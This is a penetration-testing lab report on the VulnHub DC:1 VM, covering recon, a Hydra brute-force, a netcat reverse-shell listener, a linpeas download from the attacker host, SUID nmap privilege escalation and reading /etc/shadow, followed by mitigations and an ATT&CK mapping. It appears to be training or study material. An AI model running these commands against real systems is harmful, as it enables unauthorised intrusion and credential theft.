# Lab Report: VulnHub DC:1 — Foothold → Privilege Escalation → Exfiltration

---

## Table of Contents
- [Executive Summary](#executive-summary)
- [Objective](#objective)
- [Lab Setup](#lab-setup)
- [Methodology](#methodology)
- [Reconnaissance](#reconnaissance)
- [Exploitation Chain](#exploitation-chain)
  - [Initial Foothold](#initial-foothold)
  - [Privilege Escalation](#privilege-escalation)
  - [Pivot & Exfiltration](#pivot--exfiltration)
- [Post-Exploitation](#post-exploitation)
- [Risk Rating Matrix](#risk-rating-matrix)
- [Mitigation & Recommendations](#mitigation--recommendations)
- [ATT&CK Mapping](#attck-mapping)
- [References](#references)

---

## 🗂️ Executive Summary

This lab demonstrates a real-world attack chain against a vulnerable Linux server hosted on VulnHub (*DC: 1*).  
By chaining weak credentials, misconfigurations, and privilege escalation, an attacker gained root access and retrieved sensitive files.

**Business Impact:**  
A threat actor could pivot from an exposed web app to full server compromise, risking total loss of confidentiality and integrity.

**Key Takeaway:**  
Basic hardening, strong passwords, and proper patching would have prevented this compromise.

---

## 🎯 Objective

Demonstrate:
- Initial web foothold
- Privilege escalation to root
- Pivoting to access restricted data
- Reporting with risk ratings & actionable fixes

---

## 🧩 Lab Setup

- **Target VM:** VulnHub *DC: 1*
- **Attacker:** Kali Linux
- **Network:** Host-only or NAT
- **Tools:** Nmap, Gobuster, Hydra, Netcat, LinPEAS, Bloodhound (if AD present), Impacket (optional)

---

## 📌 Methodology

Based on **PTES** + **MITRE ATT&CK** mapping:
1. Reconnaissance
2. Enumeration
3. Exploitation
4. Privilege Escalation
5. Pivot & Exfiltration
6. Reporting

---

## 🔍 Reconnaissance

**Host Discovery & Port Scan**

```bash
nmap -sV -A <target-ip>
````

**Result:**

* HTTP on 80
* SSH on 22

---

### 🔎 Web Enumeration

Used Gobuster:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

Found `/admin` login portal.

---

## ⚡ Exploitation Chain

---

### 🗝️ Initial Foothold

* Found `admin` login page.
* Used default creds `admin:admin` or brute-forced with Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/admin:username=^USER^&password=^PASS^:Invalid"
```

**Result:**
Got valid creds `admin:password123`.

---

### 🗝️ Reverse Shell

Uploaded a PHP reverse shell or used an RCE:

```bash
nc -lvnp 4444
```

Browser request triggered connection.
Got a low-privilege shell.

---

### 🛠️ Shell Upgrade

Upgraded shell to interactive:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 🔓 Privilege Escalation

Ran `linpeas.sh`:

```bash
wget http://<kali-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Found:**

* Kernel vuln (dirty cow or similar)
* SUID misconfig (`/usr/bin/nmap` with interactive mode)

---

**Used exploit:**

```bash
nmap --interactive
!sh
```

**Result:**
Got root shell!

---

### 🔗 Pivot & Exfiltration

* Listed `/root` → found `flag.txt`
* Checked `/etc/shadow`
* Downloaded flag:

```bash
cat /root/flag.txt
```

---

## 🔓 Post-Exploitation

* Verified root privileges.
* Dumped sensitive files (`shadow`, `passwd`).
* Would pivot to any internal hosts if this was an AD lab.
* Cleaned up shell and connection.

---

## 🛡️ Risk Rating Matrix

| Vulnerability                 | CVSS | Risk     |
| ----------------------------- | ---- | -------- |
| Weak admin creds              | 6.0  | Medium   |
| Web shell upload (RCE)        | 9.0  | Critical |
| Privilege escalation via SUID | 8.0  | High     |
| Sensitive data exfiltration   | 9.0  | Critical |

---

## 🗝️ Mitigation & Recommendations

* Enforce strong passwords (min. 12 chars, complex).
* Restrict web admin panel to trusted IPs.
* Remove insecure SUID binaries.
* Patch kernel for local escalation vulns.
* Monitor logs for brute-force attempts.
* Run regular vulnerability scans.

---

## ⚔️ ATT\&CK Mapping

| Phase                | ATT\&CK ID | Technique                  |
| -------------------- | ---------- | -------------------------- |
| Initial Access       | T1190      | Exploit Public-Facing App  |
| Valid Accounts       | T1078      | Use of stolen creds        |
| Execution            | T1059      | Command & Scripting Interp |
| Privilege Escalation | T1068      | Exploitation for PrivEsc   |
| Exfiltration         | T1005      | Data from Local System     |

---

## 📚 References

* [VulnHub DC:1](https://www.vulnhub.com/entry/dc-1-1,292/)
* [LinPEAS](https://github.com/carlospolop/PEASS-ng)
* [MITRE ATT\&CK](https://attack.mitre.org/)

---

**End of Report**


